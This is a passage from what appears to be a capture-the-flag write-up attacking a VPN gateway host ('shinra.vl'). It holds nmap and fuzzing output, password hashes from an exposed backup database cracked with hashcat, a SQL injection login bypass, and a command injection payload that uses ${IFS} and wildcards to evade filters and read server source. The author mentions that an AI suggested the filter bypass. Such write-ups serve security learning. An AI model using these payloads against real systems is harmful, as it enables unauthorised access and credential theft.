| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
|_imap-capabilities: listed have post-login IMAP4rev1 LITERAL+ more capabilities OK Pre-login LOGIN-REFERRALS ID AUTH=PLAIN ENABLE IDLE AUTH=LOGINA0001 SASL-IR
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3    syn-ack ttl 63 Dovecot pop3d
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA USER TOP UIDL PIPELINING SASL(PLAIN LOGIN)
8220/tcp  open  http        syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
11601/tcp open  ssl/unknown syn-ack ttl 63
| ssl-cert: Subject: organizationName=ligolo
| Subject Alternative Name: DNS:ligolo
| Issuer: organizationName=ligolo
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2026-03-10T13:22:52
| Not valid after:  2027-03-10T13:22:52
| MD5:     e89f 95c1 9aee eb4f 9c81 cc2e ca19 50c5
| SHA-1:   5a48 d1cf 782c 5e64 6c0d 30d9 5d7a ac54 29a9 d1d6
| SHA-256: 9c41 533c 5b4b 1c7b 0818 a4b8 1818 5bd6 66b9 8481 620f bc18 7e02 be64 83f8 8a6a
| -----BEGIN CERTIFICATE-----
| MIIBaTCCAQ6gAwIBAgIQJaBmckqk44vGwvmxT6EopzAKBggqhkjOPQQDAjARMQ8w
| DQYDVQQKEwZsaWdvbG8wHhcNMjYwMzEwMTMyMjUyWhcNMjcwMzEwMTMyMjUyWjAR
| MQ8wDQYDVQQKEwZsaWdvbG8wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAARVAYjX
| ufIwASVXhCJ6Her+Fs9SBvQNQDNydtImlrMA9KkbZuQlMixzUYdg4kjpKtS1uySz
| mPEC3yuvO2ri2Ds/o0gwRjAOBgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwDAYDVR0TAQH/BAIwADARBgNVHREECjAIggZsaWdvbG8wCgYIKoZIzj0E
| AwIDSQAwRgIhAM8Yj6tInb17qdGXfVq8RaqlGTzGMe6IJnpUz55zUKmdAiEAs1+6
| 2oImJB/Lvnvm5BVIf4hSpMb2OoRjb1LXjqQC6IY=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port11601-TCP:V=7.98%T=SSL%I=7%D=3/19%Time=69BC4008%P=x86_64-pc-linux-g
SF:nu%r(NULL,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x0
SF:1\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(GenericLines,26,"\0\x01\0\x01\0
SF:\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\
SF:x01\x80")%r(GetRequest,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0
SF:\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(HTTPOptions,26,"\0
SF:\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\
SF:0\x01\0\0\0\x01\x80")%r(RTSPRequest,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\
SF:0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(RPCCh
SF:eck,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\
SF:0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(DNSVersionBindReqTCP,26,"\0\x01\0\x01
SF:\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\
SF:0\x01\x80")%r(DNSStatusRequestTCP,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\
SF:0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(Help,26
SF:,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\
SF:0\0\0\x01\0\0\0\x01\x80")%r(SSLSessionReq,26,"\0\x01\0\x01\0\0\0\x01\0\
SF:0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r
SF:(TerminalServerCookie,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\
SF:x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(TLSSessionReq,26,"\
SF:0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0
SF:\0\x01\0\0\0\x01\x80")%r(Kerberos,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\
SF:0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(SMBProg
SF:Neg,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\
SF:0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(X11Probe,26,"\0\x01\0\x01\0\0\0\x01\0
SF:\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%
SF:r(FourOhFourRequest,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x0
SF:1\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80")%r(LPDString,26,"\0\x01\
SF:0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01
SF:\0\0\0\x01\x80")%r(LDAPSearchReq,26,"\0\x01\0\x01\0\0\0\x01\0\0\0\0\0\0
SF:\0\0\0\0\0\x01\0\0\0\x01\0\0\0\0\0\0\0\0\x01\0\0\0\x01\x80");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/19%OT=22%CT=%CU=38750%PV=Y%DS=2%DC=T%G=N%TM=69BC403A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

```

# HTTP

Immediately I run a VHOST scan without apparent success.

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://web01.shinra.vl/ -H "Host:FUZZ.shinra.vl" -fl 43 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://web01.shinra.vl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.shinra.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 43
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
                                                                                              
```

Next, a quick fuzzing of the web directories and I can see some extra services like mail and backup?

```bash
[19:39:06] 200 -  482B  - /js/?C=M;O=D
[19:39:17] 301 -  319B  - /backup  ->  http://web01.shinra.vl/backup/
[19:39:17] 403 -  280B  - /backup/
[19:39:20] 301 -  316B  - /css  ->  http://web01.shinra.vl/css/
[19:39:20] 200 -  496B  - /css/
[19:39:20] 302 -    4KB - /dashboard.php  ->  index.php
[19:39:20] 200 -  493B  - /css/?C=N;O=D
[19:39:20] 302 -    0B  - /logout.php  ->  index.php
[19:39:20] 200 -  650B  - /css/dashboard.css
[19:39:20] 302 -    4KB - /dashboard.php?page=status  ->  index.php
[19:39:20] 403 -  280B  - /db
[19:39:20] 200 -  496B  - /css/?C=D;O=A
[19:39:20] 403 -  280B  - /db/
[19:39:20] 403 -  280B  - /db/dbadmin/
[19:39:20] 403 -  280B  - /db/dbweb/
[19:39:20] 403 -  280B  - /db/index.php
[19:39:20] 302 -    5KB - /dashboard.php?page=vpn  ->  index.php
[19:39:20] 403 -  280B  - /db/db-admin/
[19:39:20] 403 -  280B  - /db/main.mdb
[19:39:20] 403 -  280B  - /db/phpMyAdmin-3/
[19:39:20] 403 -  280B  - /db/phpMyAdmin-2/
[19:39:20] 403 -  280B  - /db/myadmin/
[19:39:20] 403 -  280B  - /db/phpMyAdmin/
[19:39:20] 403 -  280B  - /db/phpmyadmin/
[19:39:20] 403 -  280B  - /db/phpMyAdmin3/
[19:39:20] 403 -  280B  - /db/phpmyadmin3/
[19:39:20] 403 -  280B  - /db/phpmyadmin2/
[19:39:20] 403 -  280B  - /db/webdb/
[19:39:20] 403 -  280B  - /db/sql
[19:39:20] 403 -  280B  - /db/phpMyAdmin2/
[19:39:20] 403 -  280B  - /db/webadmin/
[19:39:20] 403 -  280B  - /db/websql/
[19:39:20] 200 -  493B  - /css/?C=D;O=D
[19:39:20] 200 -  496B  - /css/?C=S;O=A
[19:39:21] 200 -  496B  - /css/?C=N;O=A
[19:39:21] 200 -   20KB - /css/bootstrap.min.css
[19:39:21] 200 -  381B  - /css/home.css
[19:39:21] 200 -  496B  - /css/?C=M;O=A
[19:39:21] 200 -  493B  - /css/?C=M;O=D
[19:39:21] 200 -  495B  - /css/?C=S;O=D
[19:39:26] 301 -  319B  - /images  ->  http://web01.shinra.vl/images/
[19:39:26] 200 -  455B  - /images/
[19:39:27] 200 -  455B  - /images/?C=S;O=A
[19:39:27] 200 -  453B  - /images/?C=S;O=D
[19:39:27] 200 -  455B  - /images/?C=D;O=A
[19:39:27] 200 -  453B  - /images/?C=D;O=D
[19:39:27] 200 -  455B  - /images/?C=N;O=A
[19:39:27] 200 -  455B  - /images/?C=M;O=A
[19:39:27] 200 -  453B  - /images/?C=M;O=D
[19:39:27] 200 -  453B  - /images/?C=N;O=D
[19:39:29] 301 -  317B  - /mail  ->  http://web01.shinra.vl/mail/

```

Now the base site points to a custom web gateway where I am supposed to ask for an account?

![470cc42e5f9b78f0c8ef1fae926553c7.png](../../../_resources/470cc42e5f9b78f0c8ef1fae926553c7.png)

The backup page is unreachable as probably it is part of the same custom application.

![ab77f0884baa3d728c2ca3c81573ddcc.png](../../../_resources/ab77f0884baa3d728c2ca3c81573ddcc.png)

And lastly the email points to a Roundcube webemail portal, which is totally not interesting at this point.

![0442aac8fafc359a4fb3302aaa46f9f9.png](../../../_resources/0442aac8fafc359a4fb3302aaa46f9f9.png)

Now injecting a dummy symbol on the base page tells me immediately there is a SQL injection possible as it reacts with the apostrophe.

![a922cb6e4f10d2319dbdeaec5de3c018.png](../../../_resources/a922cb6e4f10d2319dbdeaec5de3c018.png)

Now here I have to be extremely sensitive as it seems having some kind of fail2ban so no SQLMAP but doing a quick manual check I get an Ok?  
![0f8cc1ca734c78d3fede98d26efeb0a1.png](../../../_resources/0f8cc1ca734c78d3fede98d26efeb0a1.png)

Now I will be trying to use again SQLMAP but this time is single thread and with 5 sec delay between every request, it might be slow, but at least should not pop the blockage?

![a571b449f2c503f81fc1b4cc8a0e8660.png](../../../_resources/a571b449f2c503f81fc1b4cc8a0e8660.png)

Now here took a peek at the notes and I totally missed to do something on this site which avoids the need of a SLi. Apaprently that unreachable folder contains a juicy file:

```bash
└─$ dirsearch -u "http://web01.shinra.vl/backup" --crawl
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/millycash/Downloads/Shinra/reports/http_web01.shinra.vl/_backup_26-03-19_21-28-12.txt

Target: http://web01.shinra.vl/

[21:28:12] Starting: backup/
[21:28:26] 200 -   10KB - /backup/db

```

And it is a DB with all the users for this VPN.

![8e3ba20f01d10d414f955b1196a0dae4.png](../../../_resources/8e3ba20f01d10d414f955b1196a0dae4.png)

And here the credentials:

```bash
4295f074bf7cf303f7dd9d51f48593847c24860cac5bcda942c1b5d00d423e053c8f8a62242ae9470544f941ac89d275dfe5d39080b91a0c013f79d0f82fc9ee:user01
9493d60cc7456bab470c615c6c70d3eb3b31ebdfbcdd52bf242f8fddd7380f4af8742b41cffdccdbf4d5164cb8ac9e95574efce18a3442d4b4e7ad03ab8aeff0:user10
6a894709074af18ea638fb26417580414dc5f652ce204fe26422a91e01a3fd73f91472787448393753fea04e3bba2573874f82f411105902f178136054367348:user08
c1e26366cf464e05e169645f72ce4f51aa568f896eda516e4ebe658f1b9881491243e7b6ee17daa94d68d6eb39d6401ff8d3de0c258f985147effec5467e870a:user07
f43bb6551c366be3b5e4a4edbb738b0acca13e99d5c1e65adc5d31f53329c4f87cda09ccb33629891148815725741c93e6952976daa044b260ad260633ae0b17:user04
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: vpn_hashes.txt
Time.Started.....: Thu Mar 19 21:31:59 2026 (1 sec)
Time.Estimated...: Thu Mar 19 21:32:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 18461.0 kH/s (4.35ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 5/11 (45.45%) Digests (total), 5/11 (45.45%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 0213JR -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Temp: 58c Util: 21% Core:1890MHz Mem:8000MHz Bus:8

Started: Thu Mar 19 21:31:54 2026

```

Now the admin portal is off-limits for now, but I can see I should be able to generate something?

![c127c8a6198b2ca97c400e4febe64d68.png](../../../_resources/c127c8a6198b2ca97c400e4febe64d68.png)

And I can see that it must be the OVPN for the internal site:

```bash
client
dev tun
proto udp
remote 172.16.10.20 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
auth SHA512
cipher AES-256-CBC
ignore-unknown-option block-outside-dns
verb 3
<ca>
</ca>
<cert>
</cert>
<key>
</key>
<tls-crypt>
</tls-crypt>

```

Now VPN aside, what if the SQLi is supposed to be stored in the name?  
![3bf5bd3c26f3b70a430fcc3192e852a8.png](../../../_resources/3bf5bd3c26f3b70a430fcc3192e852a8.png)

Now I still want to abuse that SQLi on the login and i know that the SQL has 5 columns and I know that insucccess(6 columns):

![6c6f44fef68a2d9ce0cdc394ce0928bf.png](../../../_resources/6c6f44fef68a2d9ce0cdc394ce0928bf.png)

But using 5 is the correct one:

![d196fe44bcac96c0a4999a082eb9604a.png](../../../_resources/d196fe44bcac96c0a4999a082eb9604a.png)

But here after some quite things I am in with this code:

```sql
admin@test.htb'+OR+666>1+OR+'1'='
```

The reason in that the backend is using a pretended password but not the username and the base query should be something like this one:

```sql
select * from users where username='UNSANITIZED INPUT' and password = :pass
```

My query allows to bypass and login as the first user(vpnadmin) because it is letting the code balance the query and feed the password as well.

# The second day

Now here I was a bit lost and got a nudge to check for Command Injections and apparently only the name is what I can change(all commands are accepted) but the VPN configuration ins't changing att al. Plus the SQLi was totally pointless as the VPNADMIN doesn't have any different outcome compared to what I already had so far.

![854808de6e1b379e3327b061f916d33b.png](../../../_resources/854808de6e1b379e3327b061f916d33b.png)

Now what happens if I truncate the command? Here I noticed that spaces were blacklisted.

![f5eb2ff318d2325bba35d78ab43524a1.png](../../../_resources/f5eb2ff318d2325bba35d78ab43524a1.png)

But I see a success:

![e4ed0935a9b972b9ac71450320456658.png](../../../_resources/e4ed0935a9b972b9ac71450320456658.png)

Now seems like other commands are not allowed?

![3c27afbd3d260302c090d5a01dc7cf8b.png](../../../_resources/3c27afbd3d260302c090d5a01dc7cf8b.png)

Now even the dots are replaced with underscores so I can't just read that Admin page(i suspect it will have some credentials there. Now AI suggested me to use wildcad instead and surely it did work:

```bash
//Command
user01;cat${IFS}/var/www/html/dashboard*

//Response
    
<?php 
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();
if (!$_SESSION["logged_in"]) {
  header("location:index.php");
}
$username = $_SESSION['username'];
$displayname = "?";

$db = new PDO('sqlite:db/vpn.db');
$db->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );

$sql = "SELECT * FROM users WHERE username = :name";
try {
    $statement = $db->prepare($sql);
    $statement->execute(array('name' => $username));
    $row = $statement->fetch();
    if ($row) {        
        $displayname = $row['displayname'];  
    }
}
catch(PDOException $e) {
    echo "<!-- Something went wrong: ".$e->getMessage()." -->";
}
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Hugo 0.104.2">
    <title>神羅 VPN Gateway</title>

    <link href="css/bootstrap.min.css" rel="stylesheet" >

        <!-- Favicons -->   
    <meta name="theme-color" content="#712cf9">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }

      .b-example-divider {
        height: 3rem;
        background-color: rgba(0, 0, 0, .1);
        border: solid rgba(0, 0, 0, .15);
        border-width: 1px 0;
        box-shadow: inset 0 .5em 1.5em rgba(0, 0, 0, .1), inset 0 .125em .5em rgba(0, 0, 0, .15);
      }

      .b-example-vr {
        flex-shrink: 0;
        width: 1.5rem;
        height: 100vh;
      }

      .bi {
        vertical-align: -.125em;
        fill: currentColor;
      }

      .nav-scroller {
        position: relative;
        z-index: 2;
        height: 2.75rem;
        overflow-y: hidden;
      }

      .nav-scroller .nav {
        display: flex;
        flex-wrap: nowrap;
        padding-bottom: 1rem;
        margin-top: -1px;
        overflow-x: auto;
        text-align: center;
        white-space: nowrap;
        -webkit-overflow-scrolling: touch;
      }
    </style>

    
    <!-- Custom styles for this template -->
    <link href="css/dashboard.css" rel="stylesheet">
  </head>
  <body>
    
<header class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0 shadow">
  <a class="navbar-brand col-md-3 col-lg-2 me-0 px-3 fs-6" href="#">神羅 VPN Gateway</a>
  <button class="navbar-toggler position-absolute d-md-none collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#sidebarMenu" aria-controls="sidebarMenu" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>  
  <div class="navbar-nav text-white">
    <?php       
      echo "Hello ".$displayname;
    ?>
  </div>
  <div class="navbar-nav">
    <div class="nav-item text-nowrap">
      <a class="nav-link px-3" href="/logout.php">Sign out</a>
    </div>
  </div>
</header>

<div class="container-fluid">
  <div class="row">
    <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block bg-light sidebar collapse">
      <div class="position-sticky pt-3 sidebar-sticky">
        <ul class="nav flex-column">
          <li class="nav-item">
            <a class="nav-link active" aria-current="page" href="/dashboard.php?page=status">
              <span data-feather="home" class="align-text-bottom"></span>
              Status
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/dashboard.php?page=vpn">
              <span data-feather="file" class="align-text-bottom"></span>
              VPN Packs
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="?page=account" >
              <span data-feather="shopping-cart" class="align-text-bottom"></span>
              Account
            </a>
          </li>
